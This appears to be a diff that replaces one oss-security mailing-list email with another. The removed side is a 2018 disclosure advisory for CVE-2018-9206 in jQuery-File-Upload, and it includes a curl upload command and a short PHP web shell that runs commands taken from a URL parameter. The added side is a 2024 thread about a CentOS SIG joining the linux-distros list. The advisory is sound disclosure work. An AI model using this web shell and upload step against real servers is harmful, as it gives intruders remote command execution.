@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3350" "Thursday" "11" "October" "2018" "16:06:21" "+0000" "Larry W. Cashdollar" "larry0@me.com" "<70dba524-20af-4af3-9c45-698d762e1a4a@me.com>" "77" "[oss-security] =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2FkIDw9IHY5LjIyLjAgdW5hdXRoZW50aWNhdGVk?==?utf-8?B?IGFyYml0cmFyeSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5?=" nil nil nil "10" "2018101116:06:21" "[oss-security] =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2Fk?= =?utf-8?B?PD0=?= =?utf-8?B?djkuMjIuMA==?= =?utf-8?B?dW5hdXRoZW50aWNhdGVk?= =?utf-8?B?YXJiaXRyYXJ5?= =?utf-8?B?ZmlsZQ==?= =?utf-8?B?dXBsb2Fk?= =?utf-8?B?dnVsbmVyYWJpbGl0eQ==?=" (number mark "U       larry0@me.co Oct 11   77/3350  " thread-indent "\"[oss-security] =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2FkIDw9IHY5LjIyLjAgdW5hdXRoZW50aWNhdGVk?==?utf-8?B?IGFyYml0cmFyeSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5?=\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 23991 invoked by uid 550); 11 Oct 2018 16:06:54 -0000
+Received: (qmail 28371 invoked by uid 550); 15 Jul 2024 16:58:00 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,109 +7,104 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23958 invoked from network); 11 Oct 2018 16:06:54 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
-	t=1539273987; bh=l7Lm1/rp+8r5wN4H+oK/4gEbO5nT5JOka+BUubwVRL8=;
-	h=To:From:Subject:Date:Message-id:Content-type:MIME-version;
-	b=C2qhrvaGBeYiW1Vy+YZHu4Nvja5dE07JcuGgNzoLXQYBGnh4OwpmUQA9uywG+gVPF
- VNba/YnfXZeK0bPyGSP0rLDF3P1ZZtRQV5aBsRZ7omEhkBLKjo9G2krcgKiVTxYNI3
- y9BRfxja5OT5gB/VkcpXq52y12Oy5AGxRbozxbQeygrARi2Ji2Clo2ny2rTUd97y71
- QW8WqpyOYJX/T0rkN6eh2hJ2kSV6NkC8OA8WnD9zi6zV13jejCpco1eKsgtqzZPquM
- Lralvm0ZqJcObLfyJUXOXNb43PHGanXo2PFtYNsSneqT2zjCjrSqU7uqfQjgzBe3th
- 5kkN5teG0JuxA==
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
- malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
- mlxlogscore=807 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1807170000 definitions=main-1810110154
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
- definitions=2018-10-11_07:,, signatures=0
-To: Open Source Security <oss-security@lists.openwall.com>
-From: "Larry W. Cashdollar" <larry0@me.com>
-Date: Thu, 11 Oct 2018 16:06:21 +0000 (GMT)
-X-Mailer: iCloud MailClient1818Project36
- MailServer1818B30.10000-1818B-0-3db5beab3ae9
-Message-id: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
-Content-type: multipart/alternative;
- boundary=Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89
-MIME-version: 1.0
-Subject: [oss-security]
- =?utf-8?B?alF1ZXJ5LUZpbGUtVXBsb2FkIDw9IHY5LjIyLjAgdW5hdXRoZW50aWNhdGVk?=
- =?utf-8?B?IGFyYml0cmFyeSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5?=
+Received: (qmail 11635 invoked from network); 15 Jul 2024 16:46:49 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=almalinux.org; s=google; t=1721062000; x=1721666800; darn=lists.openwall.com;
+        h=content-transfer-encoding:in-reply-to:from:content-language
+         :references:to:subject:user-agent:mime-version:date:message-id:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=nX7PzINxIaA/DVtwWbja2lVWP3unObY63kmTF0Vo3vs=;
+        b=fEP3FnAVdBWDw0jdilMa+TPfq6E08mbPML6Xd5SdWipsRDVcVrPKhJL79bUzwkzmtQ
+         9VSE3Sb7KIOMkF/SaHFqZtTCwloavh4+FyH/zNqax19QQm/zqX7hI8JBPkCGU+JuuHfv
+         WEJpbf8snDo0OTYa1OpOIfe7aygQYB0FyOnipshe4CLa3hxSI5ekFMbda9Yh27Zmrpxg
+         Rsr7oI+qhjo18iML6OhaD6OUYNGR5d/EIcCCdxRbdwuxxDaOPcCJwG3oPKfj6evOdXnl
+         fZevWN4EKOMgoVZFuuUsbsz2I4GzwgWy/Ay8G2OaDQ57dMUcrG+g0OwmK0/5gW/ZPuaR
+         Lbyw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1721062000; x=1721666800;
+        h=content-transfer-encoding:in-reply-to:from:content-language
+         :references:to:subject:user-agent:mime-version:date:message-id
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=nX7PzINxIaA/DVtwWbja2lVWP3unObY63kmTF0Vo3vs=;
+        b=W0NBroPU7VoRMt70LRCfgED4tKSWZiYFhbzgFxIX+MXAks/gxnoZleKiavR/5BXZZ3
+         M2VeKwZBRelz7dd+vZU1mjEYQVKfgoiprJGsGnfJ8I42P2kLWrJkZczHklM00OqVsouj
+         VdzhsCpxP49gxL1lltHZAVDdp6susGbKIdZeujni1345vDiTD3ADeC2BaCKpn2rPUzVd
+         eWN/agTn+WjVCtmzy/KyzyJG34PcnWT0RTmxCBkppaOjJfao+SXzAwj2KAs6p57Cf4pa
+         9TizXxy6UeMbhWwiHqp0Zo5pjJ+0mWg29rF1P4onputbbvN1qX0sHObzp0MR3UPZ22N8
+         Llpg==
+X-Gm-Message-State: AOJu0YwjYCVRq6xRM+SSHTn+KbM/tgCiVJBeFeYBpm1LLDmtlJodXSP1
+	P7SiBgqaj+Pd9a4CPZbQV1ljaPVAQsWsDaBHtQP0NDZqWdI86cimF8hTW6ePExSLT4DClH5nxoC
+	h
+X-Google-Smtp-Source: AGHT+IGBJIUUVmkyMgxLNvL7L0pO4++491hriovhxYLhwrfwmZupKPkyLlo6eIKT1ZMXe9JNhBcZKw==
+X-Received: by 2002:a0d:e602:0:b0:613:febf:7a7c with SMTP id 00721157ae682-663542a2fbfmr513667b3.16.1721061999818;
+        Mon, 15 Jul 2024 09:46:39 -0700 (PDT)
+Message-ID: <cc557953-68e0-4e47-ac66-d3a98278864e@almalinux.org>
+Date: Mon, 15 Jul 2024 11:46:39 -0500
+MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+To: oss-security@lists.openwall.com
+References: <Zo61nFk8VulWf7_J@michel-fedora-PC198L6J>
+ <Zo7mU_N9joNTZ4gV@itl-email> <Zo759RRNseuva6zO@aeon>
+ <Zo8fJWNFia9y2BS8@michel-fedora-PC198L6J>
+Content-Language: en-US
+From: Jonathan Wright <jonathan@almalinux.org>
+In-Reply-To: <Zo8fJWNFia9y2BS8@michel-fedora-PC198L6J>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+Subject: Re: [oss-security] linux-distros application for CentOS Project's
+ Hyperscale SIG
 
---Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;
-    charset=utf-8;
-    format=flowed
+Just to confirm, I'm more than happy to vouch for Michel, Davide, and 
+Neal.  I've been working with all 3 for a couple of years now and 
+they're an excellent fit for the list.
 
-Title: jQuery-File-Upload <=3D v9.22.0 unauthenticated arbitrary file uploa=
-d vulnerability
-Author: Larry W. Cashdollar, @_larry0
-Date: 2018-10-09
-CVE-ID:[CVE-2018-9206]
-Download Site: https://github.com/blueimp/jQuery-File-Upload/
-Vendor: https://github.com/blueimp
-Vendor Notified: 2018-10-09
-Vendor Contact:
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D204
-Description: File Upload widget with multiple file selection, drag&drop sup=
-port, progress bar, validation and preview images, audio and video for jQue=
-ry. Supports cross-domain, chunked and resumable file uploads. Works with a=
-ny server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Jav=
-a, etc.) that supports standard HTML form file uploads.
-Vulnerability:
-The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/serve=
-r/php/UploadHandler.php doesn't require any validation to upload files to t=
-he server. It also doesn't exclude file types. This allows for remote code =
-execution.
-
-
-Exploit Code:
-$ curl -F "files=3D@shell.php" http://localhost/jQuery-File-Upload-9.22.0/s=
-erver/php/index.php
-
-Where shell.php is:
-
-<?php
-$cmd=3D$_GET['cmd'];
-system($cmd);
-?>
-Screen Shots:
-Notes: Actively being exploited in the wild. https://github.com/blueimp/jQu=
-ery-File-Upload/pull/3514=
-
---Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89
-Content-Type: multipart/related;
-    type="text/html";
-    boundary=Apple-Webmail-86--27b34b8e-ce84-4ea9-9645-c1912c64dd89
-
-
---Apple-Webmail-86--27b34b8e-ce84-4ea9-9645-c1912c64dd89
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/html;
-    charset=utf-8;
-
-<html><body><div>Title: jQuery-File-Upload &lt;=3D v9.22.0 unauthenticated =
-arbitrary file upload vulnerability<br>Author: Larry W. Cashdollar, @_larry=
-0<br>Date: 2018-10-09<br>CVE-ID:[CVE-2018-9206]<br>Download Site: https://g=
-ithub.com/blueimp/jQuery-File-Upload/<br>Vendor: https://github.com/blueimp=
-<br>Vendor Notified: 2018-10-09<br>Vendor Contact:<br>Advisory: http://www.=
-vapidlabs.com/advisory.php?v=3D204<br>Description: File Upload widget with =
-multiple file selection, drag&amp;drop support, progress bar, validation an=
-d preview images, audio and video for jQuery. Supports cross-domain, chunke=
-d and resumable file uploads. Works with any server-side platform (Google A=
-pp Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard H=
-TML form file uploads.<br>Vulnerability:<br>The code in https://github.com/=
-blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't=
- require any validation to upload files to the server. It also doesn't excl=
-ude file types. This allows for remote code execution.<br><br><br>Exploit C=
-ode:<br>$ curl -F "files=3D@shell.php" http://localhost/jQuery-File-Upload-=
-9.22.0/server/php/index.php<br> <br>Where shell.php is:<br> <br>&lt;?php </=
-div><div>$cmd=3D$_GET['cmd']; </div><div>system($cmd);</div><div>?&gt;<br>S=
-creen Shots:<br>Notes: Actively being exploited in the wild. https://github=
-.com/blueimp/jQuery-File-Upload/pull/3514</div></body></html>=
-
---Apple-Webmail-86--27b34b8e-ce84-4ea9-9645-c1912c64dd89--
-
---Apple-Webmail-42--27b34b8e-ce84-4ea9-9645-c1912c64dd89--
-
+On 7/10/2024 6:54 PM, Michel Lind wrote:
+> Hi Demi, Mark,
+> On Wed, Jul 10, 2024 at 04:15:33PM -0500, Mark Esler wrote:
+>> On Wed, Jul 10, 2024 at 03:51:44PM -0400, Demi Marie Obenour wrote:
+>>> On Wed, Jul 10, 2024 at 11:23:56AM -0500, Michel Lind wrote:
+>>>> I am submitting this application on behalf of CentOS Project's Hyperscale SIG.
+>>>>
+>>>> Myself (Michel Lind), as well as Davide Cavalca and Neal Gompa (SIG co-chairs), would be joining if approved.
+>>>>    https://sigs.centos.org/hyperscale/sig/membership/
+>>>>
+>>> I know that at least Neal Gompa is also a Fedora developer.  Would it
+>>> be permissible for him to also handle security patches for Fedora, if
+>>> Fedora is also affected?
+> All three of us are Fedora developers - but AIUI, we will not and can not use
+> membership here to contribute Fedora patches - until the embargo is
+> over.
+>
+> For Hyperscale itself we plan to use the head start to have local builds
+> ready to go, and commit and do a public build as soon as the embargo is
+> over; if it needs collaboration we can use private Git repos and E2EE
+> private chats to discuss the fix among ourselves.
+>
+> This is, to the best of my knowledge, similar to how AlmaLinux handles
+> embargoed security issues - the fix is ready to go but is only made
+> available once the embargo is lifted.
+>
+> Now - wearing our Fedora hats, we certainly would try and help get this
+> fixed in Fedora once the embargo is over (as we've done before) - and
+> knowing a CVE is going to be made public would certainly help (e.g.
+> trying to make sure one of us is around) - but we won't be participating
+> in the list wearing our Fedora hat, or discuss embargoed issues with
+> people not on the list.
+>
+>> I am curious what this could mean for Fedora Asahi Remix [0], as the
+>> applicants maintain both distros.
+>>
+>> Is there interest in the Asahi SIG applying as well?
+>>
+>> I heartily endorse the applicants membership request and appreciate
+>> their work. Hooray for ARM \o/
+>>
+> So... if this works for Hyperscale, we could potentially discuss with
+> other Fedora developers about having Fedora itself be represented in
+> linux-distros. Something to bring up at Flock! There's already some
+> discussion of this in the Fedora Security Matrix room w.r.t. last week's
+> OpenSSH CVE.
+>
+>
+> Best regards,
+>
